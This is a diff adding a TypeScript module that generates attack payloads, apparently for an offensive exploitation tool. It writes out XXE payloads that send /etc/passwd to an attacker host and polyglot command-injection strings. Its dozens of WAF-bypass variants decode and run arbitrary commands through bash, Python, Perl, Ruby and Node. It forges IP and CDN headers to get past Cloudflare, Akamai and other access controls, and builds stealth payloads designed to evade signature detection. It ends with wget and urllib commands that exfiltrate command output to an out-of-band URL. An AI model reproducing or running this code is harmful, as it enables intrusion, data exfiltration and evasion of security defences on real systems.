+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>`,
+        `<?xml version="1.0"?><!DOCTYPE r[<!ENTITY % p1 "<!ENTITY exfil SYSTEM 'http://${xh}:${xp}/?x=%25c;'>"><!ENTITY % c SYSTEM "file:///etc/passwd">%p1;]><r>&exfil;</r>`,
+      ].join("\n");
+    }
+
+    case "polyglot": {
+      const q  = raw.replace(/'/g, "\\'");
+      const dq = raw.replace(/"/g, '\\"');
+      return [
+        `'; ${raw}; echo '`,
+        `" && ${raw} && "`,
+        `$(${raw})`,
+        "`" + raw + "`",
+        `'; ${raw}; {{${raw}}}; <!--${raw}-->; "`,
+        `1' OR '1'='1'; ${raw}; --`,
+        `<svg/onload="${dq}">`,
+        `javascript:${raw}//`,
+        `${raw}%0a${raw}%0d%0a${raw}`,
+        `\r\n${raw}\r\n`,
+        `\x00${raw}\x00`,
+        `{${raw}}; ${raw}; \${${raw}}`,
+        `'+(${raw})+'`,
+        `\`;${raw};//`,
+        `<script>eval("${dq}")</script>`,
+        `{{constructor.constructor('${q}')()}}`,
+      ].join("\n");
+    }
+
+    case "rev_shell":
+      return buildReverseShells(attackerIp, attackerPort).slice(0, 8).join("\n");
+
+    case "cloud":
+      return buildCloudMetaPayloads(raw).join("\n");
+
+    case "container":
+      return buildContainerEscapes(raw).join("\n");
+
+    case "timing":
+      return buildTimingPayloads(7).join("\n");
+
+    case "stealth":
+      return buildStealthPayloads(raw).join("\n");
+
+    case "windows":
+      return buildWindowsPayloads(raw).join("\n");
+
+    case "windows_timing":
+      return buildWindowsTimingPayloads(7).join("\n");
+
+    case "windows_rev":
+      return buildWindowsReverseShells(attackerIp, attackerPort).join("\n");
+
+    case "antiforensics":
+      return buildAntiForensicsPayloads(raw).join("\n");
+
+    default:
+      return raw;
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   WAF BYPASS VARIANTS  —  60+ proven bypass techniques
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildWafBypass(payload: string): string {
+  const B64    = b64(payload);
+  const B64x2  = b64(B64);
+  const B64u   = b64url(payload);
+  const HEX    = hexEsc(payload);
+  const OCT    = octEsc(payload);
+  const RHEX   = rawHex(payload);
+  const words  = payload.split(/\s+/);
+  const broken = breakKeywords(payload);
+  const brkDQ  = breakKeywordsDQ(payload);
+  const splitC = splitConcat(payload);
+  const ifsRep = payload.replace(/ /g, IFS);
+  const tabRep = payload.replace(/ /g, TAB);
+
+  const variants: string[] = [
+    /* ── base64 ── */
+    `{echo,${B64}}|{base64,-d}|bash`,
+    `bash<<<$(echo${TAB}${B64}|base64${TAB}-d)`,
+    `bash -c "$(echo${TAB}${B64}|base64${TAB}-d)"`,
+    `{ _a="${B64x2}";bash<<<$(echo "$_a"|base64 -d|base64 -d); }`,
+    `perl -MMIME::Base64 -e "system(decode_base64('${B64}'))"`,
+    `python3 -c "import base64,os;os.system(base64.b64decode('${B64}').decode())"`,
+    `ruby -e "require 'base64';system(Base64.decode64('${B64}'))"`,
+    `node -e "require('child_process').execSync(Buffer.from('${B64}','base64').toString(),{stdio:'inherit'})"`,
+    `echo${IFS}${B64}|base64${IFS}-d|bash`,
+    `echo ${B64u}|python3 -c "import sys,base64,os;os.system(base64.urlsafe_b64decode(sys.stdin.read().strip()).decode())"`,
+    `echo ${B64}|openssl enc -d -base64|bash`,
+    /* ── hex ── */
+    `eval "$(printf '${HEX}')"`,
+    `eval "$(printf '${OCT}')"`,
+    `perl -e "system(pack('H*','${RHEX}'))"`,
+    `python3 -c "import os;os.system(bytes.fromhex('${RHEX}').decode())"`,
+    `echo ${RHEX}|xxd -r -p|bash`,
+    `bash -c "$(printf '%b' '${HEX}')"`,
+    `{ _NX="$(printf '${HEX}')"; eval "$_NX"; }`,
+    `ruby -e "system([${charCodes(payload)}].pack('C*'))"`,
+    `node -e "require('child_process').execSync(Buffer.from('${RHEX}','hex').toString(),{stdio:'inherit'})"`,
+    `printf '${HEX}'|bash`,
+    `printf '%b' '${HEX}'|bash`,
+    `echo ${RHEX}|perl -pe 's/([0-9a-f]{2})/chr(hex($1))/gie'|bash`,
+    /* ── IFS ── */
+    ifsRep,
+    tabRep,
+    `{ IFS=,; set -- ${words.join(",")}; "$@"; }`,
+    payload.replace(/ /g, "${IFS:0:1}"),
+    payload.replace(/ /g, "$'\\x20'"),
+    payload.replace(/ /g, "$'\\t'"),
+    /* ── keyword break ── */
+    broken,
+    brkDQ,
+    splitC,
+    /* ── wildcard ── */
+    `/???/b??h -c ${JSON.stringify(payload)}`,
+    `/???/b??h<<<$(echo${TAB}${B64}|base64${TAB}-d)`,
+    `/[b][i][n]/[b][a][s][h] -c ${JSON.stringify(payload)}`,
+    `{b,}a{s,}h -c ${JSON.stringify(payload)}`,
+    /* ── variable env ── */
+    `X=${JSON.stringify(payload)};bash -c "$X"`,
+    `{ read _NX<<<${JSON.stringify(payload)};bash -c "$_NX"; }`,
+    `$(which bash) -c ${JSON.stringify(payload)}`,
+    `declare _NX=${JSON.stringify(payload)};eval "$_NX"`,
+    `BASH_ENV=/dev/stdin bash <<<${JSON.stringify(payload)}`,
+    /* ── process substitution ── */
+    `source <(echo ${B64}|base64 -d)`,
+    `. <(echo ${B64}|base64 -d)`,
+    `bash <(printf '${HEX}')`,
+    /* ── ansi-c ── */
+    `bash -c $'${payload.replace(/\\/g,"\\\\").replace(/'/g,"\\'")}' `,
+    /* ── brace ── */
+    `{echo,${B64}}|{base64,-d}|{bash,}`,
+    /* ── heredoc ── */
+    `bash<<<$(echo${IFS}${B64}|base64${IFS}-d)`,
+    /* ── encoding ── */
+    urlEnc(payload),
+    dblUrlEnc(payload),
+    htmlEnc(payload),
+    /* ── python exec ── */
+    `python3 -c "exec(__import__('base64').b64decode('${B64}').decode())"`,
+    /* ── rev ── */
+    `echo ${JSON.stringify(payload.split("").reverse().join(""))}|rev|bash`,
+    /* ── xargs ── */
+    `echo ${JSON.stringify(payload)}|xargs -I{} bash -c {}`,
+    /* ── printf chain ── */
+    printfBuild(payload),
+    `$(printf '${HEX}')`,
+    /* ── null byte ── */
+    `${payload}$'\\x00'`,
+    /* ── varslice ── */
+    varSlice(payload),
+    /* ── charcode build ── */
+    `python3 -c "import os;os.system(bytes([${charCodes(payload)}]).decode())"`,
+    `node -e "require('child_process').execSync(String.fromCharCode(${charCodes(payload)}),{stdio:'inherit'})"`,
+  ];
+
+  return [...new Set(variants)].join("\n");
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   HTTP BYPASS HEADERS
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildHttpBypassHeaders(): Array<Record<string, string>> {
+  const RFC_IPS = ["127.0.0.1","127.0.0.2","10.0.0.1","10.0.0.127","192.168.0.1","192.168.1.1","172.16.0.1","0.0.0.0","::1","::ffff:127.0.0.1"];
+  const ip  = () => RFC_IPS[Math.floor(Math.random() * RFC_IPS.length)]!;
+  const rid = () => Math.random().toString(36).slice(2, 10);
+
+  const chrome126Win = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36";
+  const chrome126Lin = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36";
+  const ff128Lin     = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0";
+  const ff128Win     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0";
+  const safari17mac  = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15";
+  const edge126      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36 Edg/126.0.2592.87";
+  const chromeMobile = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.128 Mobile Safari/537.36";
+  const gbot         = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
+  const bingbot      = "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)";
+
+  return [
+    {
+      "User-Agent": chrome126Win,
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Connection": "keep-alive",
+      "Upgrade-Insecure-Requests": "1",
+      "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1",
+      "sec-ch-ua": `"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"`,
+      "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
+      "X-Forwarded-For": `${ip()}, ${ip()}`, "X-Real-IP": ip(),
+    },
+    {
+      "User-Agent": ff128Lin,
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Connection": "keep-alive",
+      "Upgrade-Insecure-Requests": "1",
+      "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?1",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Original-URL": "/", "X-Rewrite-URL": "/",
+    },
+    {
+      "User-Agent": safari17mac,
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Connection": "keep-alive",
+      "X-Forwarded-For": ip(), "X-Real-IP": ip(),
+      "X-Forwarded-Proto": "https", "X-Forwarded-Port": "443",
+    },
+    {
+      "User-Agent": edge126,
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Connection": "keep-alive",
+      "sec-ch-ua": `"Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126"`,
+      "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
+      "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-Site": "none",
+      "X-Forwarded-For": "::1", "X-Real-IP": "::1",
+    },
+    {
+      "User-Agent": chrome126Win,
+      "Accept": "application/json, text/plain, */*",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Connection": "keep-alive",
+      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "X-Requested-With": "XMLHttpRequest",
+      "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
+      "Sec-Fetch-Site": "same-origin",
+      "sec-ch-ua": `"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"`,
+      "X-Forwarded-For": ip(),
+    },
+    {
+      "User-Agent": ff128Win,
+      "Accept": "application/json, text/javascript, */*; q=0.01",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Accept-Encoding": "gzip, deflate, br",
+      "X-Requested-With": "XMLHttpRequest",
+      "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
+      "Sec-Fetch-Site": "same-origin",
+      "Referer": "https://www.google.com/",
+      "X-Forwarded-For": ip(),
+    },
+    {
+      "User-Agent": chromeMobile,
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Accept-Encoding": "gzip, deflate, br",
+      "sec-ch-ua": `"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"`,
+      "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
+      "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
+      "X-Forwarded-For": ip(),
+    },
+    {
+      "User-Agent": gbot,
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Encoding": "gzip, deflate",
+      "From": "googlebot(at)googlebot.com",
+      "X-Forwarded-For": "66.249.66.1",
+      "X-Real-IP": "66.249.66.1",
+    },
+    {
+      "User-Agent": bingbot,
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Encoding": "gzip, deflate",
+      "From": "bingbot(at)microsoft.com",
+      "X-Forwarded-For": "40.77.167.0",
+    },
+    {
+      "User-Agent": chrome126Lin,
+      "Accept": "*/*",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Referer": "https://www.google.com/",
+      "Origin": "https://www.google.com",
+      "X-Forwarded-For": `${ip()}, ${ip()}, ${ip()}`,
+      "X-Real-IP": ip(),
+      "Via": `1.1 ${ip()}`,
+      "Forwarded": `for=${ip()};proto=https`,
+      "True-Client-IP": ip(),
+      "CF-Connecting-IP": ip(),
+    },
+    {
+      "User-Agent": chrome126Win,
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.9",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Originating-IP": "127.0.0.1",
+      "X-Client-IP": "127.0.0.1",
+      "X-Host": "localhost",
+      "X-Forwarded-Host": "localhost",
+      "X-Forwarded-Server": "localhost",
+      "X-Custom-IP-Authorization": "127.0.0.1",
+    },
+    {
+      "User-Agent": ff128Lin,
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "X-HTTP-Method-Override": "GET",
+      "X-Method-Override": "GET",
+      "X-Forwarded-For": "0.0.0.0",
+      "X-Real-IP": "0.0.0.0",
+      "X-Cluster-Client-IP": "0.0.0.0",
+      "X-Request-ID": rid(),
+    },
+    {
+      "User-Agent": safari17mac,
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-GB,en;q=0.9",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Cache-Control": "max-age=0",
+      "X-Forwarded-For": ip(),
+      "X-Azure-SocketIP": ip(), "X-Azure-ClientIP": ip(), "X-MS-Client-IP": ip(),
+    },
+    {
+      "User-Agent": edge126,
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Connection": "keep-alive",
+      "Transfer-Encoding": "chunked",
+      "TE": "trailers",
+      "X-Forwarded-For": ip(),
+      "X-Wap-Profile": `http://${ip()}/wap.xml`,
+    },
+    {
+      "User-Agent": chrome126Lin,
+      "Accept": "application/json, text/plain, */*",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Content-Type": "application/json;charset=utf-8",
+      "X-CSRF-Token": "null",
+      "X-Request-ID": rid(),
+      "X-Forwarded-For": `${ip()}, ${ip()}`,
+      "X-ProxyUser-Ip": ip(),
+    },
+    /* ── Chrome 131 (latest stable as of 2025) ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "sec-ch-ua": '"Google Chrome";v="131","Chromium";v="131","Not_A Brand";v="24"',
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": '"Windows"',
+      "sec-ch-ua-platform-version": '"15.0.0"',
+      "Sec-Fetch-Dest": "document",
+      "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-Site": "none",
+      "Sec-Fetch-User": "?1",
+      "Upgrade-Insecure-Requests": "1",
+      "X-Forwarded-For": ip(),
+      "X-Real-IP": ip(),
+    },
+    /* ── Firefox 133 ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Sec-Fetch-Dest": "document",
+      "Sec-Fetch-Mode": "navigate",
+      "Sec-Fetch-Site": "cross-site",
+      "Priority": "u=0, i",
+      "X-Forwarded-For": ip(),
+      "X-Real-IP": ip(),
+    },
+    /* ── Cloudflare edge IP bypass (CF-Connecting-IP spoofing) ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.9",
+      "CF-Connecting-IP": "127.0.0.1",
+      "CF-IPCountry": "US",
+      "CF-RAY": `${rid()}-IAD`,
+      "CF-Visitor": '{"scheme":"https"}',
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+      "True-Client-IP": "127.0.0.1",
+    },
+    /* ── AWS CloudFront bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip, deflate, br",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Amzn-Trace-Id": `Root=1-${rid()}-${rid()}`,
+      "X-Amz-Cf-Id": rid(),
+      "Via": `1.1 ${rid()}.cloudfront.net (CloudFront)`,
+      "X-Real-IP": "127.0.0.1",
+    },
+    /* ── Azure Front Door bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Encoding": "gzip, deflate, br",
+      "X-Azure-SocketIP": "127.0.0.1",
+      "X-Azure-ClientIP": "127.0.0.1",
+      "X-FD-HealthProbe": "1",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+    },
+    /* ── Fastly CDN bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Fastly-Client-IP": "127.0.0.1",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+      "Fastly-SSL": "1",
+    },
+    /* ── Akamai edge bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip, deflate, br",
+      "X-Akamai-CIP": "127.0.0.1",
+      "True-Client-IP": "127.0.0.1",
+      "X-Forwarded-For": "127.0.0.1",
+      "Akamai-Origin-Hop": "1",
+      "X-Check-Cacheable": "YES",
+    },
+    /* ── Internal load-balancer trust header ── */
+    {
+      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+      "Accept": "application/json, text/plain, */*",
+      "Accept-Encoding": "gzip, deflate",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+      "X-Internal-IP": "127.0.0.1",
+      "X-Originating-IP": "127.0.0.1",
+      "X-Remote-IP": "127.0.0.1",
+      "X-Remote-Addr": "127.0.0.1",
+      "X-Trusted-IP": "127.0.0.1",
+      "Forwarded": "for=127.0.0.1;proto=https;by=127.0.0.1",
+    },
+    /* ── Content-type variation bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Content-Type": "application/x-www-form-urlencoded ; charset=UTF-8",
+      "X-Requested-With": "XMLHttpRequest",
+      "X-Forwarded-For": ip(),
+      "X-Real-IP": ip(),
+      "Origin": "null",
+    },
+    /* ── Admin / internal bypass headers ── */
+    {
+      "User-Agent": "Mozilla/5.0 (compatible; internal-health-check/1.0)",
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip, deflate",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+      "X-Forwarded-Host": "localhost",
+      "X-Forwarded-Server": "localhost",
+      "X-Forwarded-Port": "80",
+      "X-Original-URL": "/",
+      "X-Rewrite-URL": "/",
+      "X-Custom-IP-Authorization": "127.0.0.1",
+      "X-ProxyUser-Ip": "127.0.0.1",
+    },
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   CHUNKED BYPASS  —  for length-limited injection fields
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildChunkedBypass(payload: string, chunkSize = 16): string[] {
+  const B64    = b64(payload);
+  const chunks: string[] = [];
+  for (let i = 0; i < B64.length; i += chunkSize) chunks.push(B64.slice(i, i + chunkSize));
+  const vnames  = chunks.map((_, i) => `_NXC${i}`);
+  const assigns = chunks.map((c, i) => `${vnames[i]}=${JSON.stringify(c)}`).join(";");
+  const concat  = vnames.map(v => `$${v}`).join("");
+  return [
+    `${assigns};eval$(echo ${concat}|base64 -d)`,
+    `${assigns};bash<<<$(echo ${concat}|base64 -d)`,
+    `${assigns};python3 -c "import base64,os;os.system(base64.b64decode(${JSON.stringify(B64)}).decode())"`,
+    chunks.map((c,i)=>`export ${vnames[i]}=${JSON.stringify(c)}`).join(";") + `;eval$(echo ${concat}|base64 -d)`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   COMPATIBILITY EXPORTS — used by streamExec.ts
+   ═══════════════════════════════════════════════════════════════════════════ */
+
+/** Returns an array of WAF-bypass payload variants for a given payload string. */
+export function buildPayloadVariants(payload: string): string[] {
+  return buildWafBypass(payload)
+    .split("\n")
+    .map(l => l.trim())
+    .filter(l => l.length > 0);
+}
+
+/** Returns an array of SSTI payload strings for the given command. */
+export function buildSSTIPayloads(cmd: string): string[] {
+  return applyQuantumBypass(cmd, "ssti")
+    .split("\n")
+    .map(l => l.trim())
+    .filter(l => l.length > 0);
+}
+
+/** Returns an array of Log4Shell JNDI payload strings targeting attackerIp:attackerPort. */
+export function buildLog4ShellPayloads(attackerIp: string, attackerPort: string): string[] {
+  return applyQuantumBypass("exploit", "log4shell", attackerIp, attackerPort)
+    .split("\n")
+    .map(l => l.trim())
+    .filter(l => l.length > 0);
+}
+
+/** Returns an array of XXE payload strings for the given attacker host/port. */
+export function buildXXEPayloads(attackerIp: string, attackerPort: string): string[] {
+  return applyQuantumBypass("exploit", "xxe", attackerIp, attackerPort)
+    .split("\n")
+    .map(l => l.trim())
+    .filter(l => l.length > 0);
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   TIMING ORACLE — sleep-based blind RCE detection
+   Deliberately avoids curl/wget/base64 to stay under WAF radar.
+   Uses multiple sleep primitives so at least one works per target platform.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildTimingPayloads(delaySec = 7): string[] {
+  const d   = String(Math.floor(delaySec));
+  const ms  = String(Math.floor(delaySec) * 1000);
+  const IFS = "${IFS}";
+  const T   = "\t";
+
+  return [
+    `;sleep${IFS}${d}`,
+    `|sleep${IFS}${d}`,
+    `&&sleep${IFS}${d}&&`,
+    `%0asleep${IFS}${d}%0a`,
+    `;sleep${T}${d}`,
+    `;/???/sleep${IFS}${d}`,
+    `;/usr/bin/sleep${IFS}${d}`,
+    `;/bin/sleep${IFS}${d}`,
+    `;$(printf${IFS}'\\x73\\x6c\\x65\\x65\\x70')${IFS}${d}`,
+    `;$0<<<"sleep${IFS}${d}"`,
+    `;ping${IFS}-c${IFS}${d}${IFS}127.0.0.1`,
+    `|ping${IFS}-c${IFS}${d}${IFS}127.0.0.1`,
+    `;ping${T}-c${T}${d}${T}127.0.0.1`,
+    `;ping${IFS}-c${IFS}${d}${IFS}::1`,
+    `;python3${IFS}-c${IFS}'import${IFS}time;time.sleep(${d})'`,
+    `;python${IFS}-c${IFS}'import${IFS}time;time.sleep(${d})'`,
+    `;perl${IFS}-e${IFS}'sleep(${d})'`,
+    `;ruby${IFS}-e${IFS}"sleep(${d})"`,
+    `;node${IFS}-e${IFS}"var${IFS}s=Date.now();while(Date.now()-s<${ms}){}"`,
+    `;php${IFS}-r${IFS}"sleep(${d});"`,
+    `;usleep${IFS}$((${d}*1000000))`,
+    `;sleep${IFS}${d}.0`,
+    `;read${IFS}-t${IFS}${d}${IFS}__x`,
+    `|read${IFS}-t${IFS}${d}${IFS}__x`,
+    `;$(printf${IFS}'\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68')${IFS}-c${IFS}'sleep${IFS}${d}'`,
+    `;_s=sleep;$_s${IFS}${d}`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   STEALTH PAYLOADS — avoid base64/bash/eval keywords
+   Uses $0 (current shell ref), printf hex/octal, IFS, read built-in.
+   Designed to look like benign input to WAF signature matchers.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildStealthPayloads(cmd: string): string[] {
+  const HEX    = hexEsc(cmd);
+  const OCT    = octEsc(cmd);
+  const IFS    = "${IFS}";
+  const T      = "\t";
+  const words  = cmd.split(/\s+/);
+  const bin0   = words[0] ?? "id";
+  const args   = words.slice(1).join(" ");
+  const tabCmd = cmd.replace(/ /g, T);
+  const Q      = JSON.stringify(cmd);
+
+  return [
+    `;$0<<<${Q}`,
+    `|$0<<<${Q}`,
+    `&&$0<<<${Q}&&`,
+    `;$(printf${IFS}'${HEX}')`,
+    `|$(printf${IFS}'${HEX}')`,
+    `;$(printf${IFS}'${OCT}')`,
+    `;printf${IFS}'${HEX}'|$0`,
+    `;printf${IFS}'${OCT}'|$0`,
+    `;$0<<<"$(printf${IFS}'${HEX}')"`,
+    `;read${IFS}_C<<<${Q};$0<<<"$_C"`,
+    `;_C=${Q};$0<<<$_C`,
+    `;export${IFS}_NXC=${Q};$0<<<$_NXC`,
+    `;${tabCmd}`,
+    `;${cmd.replace(/ /g, IFS)}`,
+    `;{${cmd};}`,
+    `;(${cmd})`,
+    `;/???/b??h<<<${Q}`,
+    `;.${T}<(printf${IFS}'${HEX}')`,
+    `;_B=$0;$_B<<<"${cmd.replace(/"/g, '\\"')}"`,
+    `;${bin0}${T}${args}`,
+    `;${cmd}&true`,
+    `;${cmd}${IFS}2>&1`,
+    `\n${cmd}\n`,
+    `\r\n${cmd}\r\n`,
+    `;declare${IFS}_D=${Q};$0<<<$_D`,
+    `;export${IFS}BASH_ENV=/dev/stdin;$0<<<${Q}`,
+    `;$(command${IFS}-v${IFS}sh)<<<${Q}`,
+    `;$(type${IFS}-p${IFS}sh)<<<${Q}`,
+    `;exec${IFS}-a${IFS}'[kworker/0:0]'${IFS}$0<<<${Q}`,
+    `;${IFS}${cmd}${IFS}`,
+    `;mapfile${IFS}-t${IFS}_A<<<${Q};$0<<<$_A`,
+    `;_X=$(printf${IFS}'${HEX}');$_X`,
+    `;${bin0}<<<${JSON.stringify(args)}`,
+    `;$SHELL<<<${Q}`,
+    `;$BASH<<<${Q}`,
+    `;source${IFS}<(printf${IFS}'${HEX}')`,
+    `;.${IFS}<(echo${IFS}${Q})`,
+  ].filter(p => p.trim().length > 1);
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   LOW-NOISE OOB EXFIL — wget / python urllib / /dev/tcp (no curl)
+   curl is the most-blocked exfil binary. These use alternatives.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildLowNoiseOobPayloads(cmd: string, oobUrl: string, tok: string): string[] {
+  const IFS     = "${IFS}";
+  let host      = "localhost";
+  let oobPort   = "80";
+  try {
+    const u   = new URL(oobUrl);
+    host      = u.hostname;
+    oobPort   = u.port || (u.protocol === "https:" ? "443" : "80");
+  } catch { /* keep defaults */ }
+
+  return [
+    `_O=$(${cmd}${IFS}2>&1);wget${IFS}-qO/dev/null${IFS}--timeout=8${IFS}"${oobUrl}/${tok}?d=$(printf${IFS}'%s'${IFS}"$_O"|head${IFS}-c200|tr${IFS}-cd${IFS}'A-Za-z0-9+/=')" 2>/dev/null &`,
+    `_O=$(${cmd}${IFS}2>&1);python3${IFS}-c${IFS}"import urllib.request as r,base64,os;r.urlopen('${oobUrl}/${tok}?d='+base64.b64encode(os.popen(${JSON.stringify(cmd)}).read(512).encode()).decode().replace('+','%2B'))" 2>/dev/null &`,
